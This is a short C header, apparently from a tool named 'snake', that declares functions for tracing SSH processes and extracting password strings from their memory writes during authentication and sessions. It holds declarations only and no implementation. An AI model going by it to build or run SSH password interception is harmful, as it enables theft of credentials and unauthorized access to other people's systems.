#ifndef SNAKE_SSH_TRACER
#define SNAKE_SSH_TRACER

char *extract_write_string(pid_t traced_process, long length);
char *find_password_write(char *memory, unsigned long len);

void intercept_ssh(pid_t traced_process);
void intercept_ssh_auth(pid_t traced_process);
void intercept_ssh_session(pid_t traced_process);

#endif
